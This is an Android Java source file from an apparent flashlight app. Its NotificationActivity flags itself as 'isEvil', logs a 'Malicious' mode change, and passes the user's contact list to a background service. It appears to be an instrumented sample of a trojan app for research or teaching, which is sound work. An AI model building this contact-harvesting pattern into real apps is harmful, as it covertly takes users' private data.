package com.example.flashlight_imagebutton_app_java;


import android.content.Intent;
import android.os.Handler;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;
import java.util.HashMap;
import java.util.Objects;

public class NotificationActivity extends AppCompatActivity {
    HashMap<String,String> contacts_List = new HashMap<String,String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        MainActivity.version="17";
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onCreate()","Malicious");
        contacts_List = (HashMap<String,String>) getIntent().getExtras().get("CONTACT_LIST");
        Log.d("Notify","Receive the data of Contacts.");

        Intent intent = new Intent(this, BackgroundService.class);
        intent.putExtra("CONTACT_LIST", contacts_List);
        startService(intent);
        Log.d("Notify","Triggering the BackgroundService");
    }
}